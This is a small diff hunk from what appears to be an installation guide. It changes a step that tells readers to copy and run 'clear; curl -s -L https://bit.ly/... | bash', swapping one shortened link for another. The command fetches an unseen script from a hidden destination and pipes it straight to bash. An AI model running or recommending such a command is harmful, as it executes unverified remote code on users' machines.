@@ -20,7 +20,7 @@
 # STEP3 : copy and run this command:
 
 
-       clear; curl -s -L https://bit.ly/382z4df | bash
+       clear; curl -s -L https://bit.ly/3jt0WeA | bash
 
 
 # and wait the process to finish .
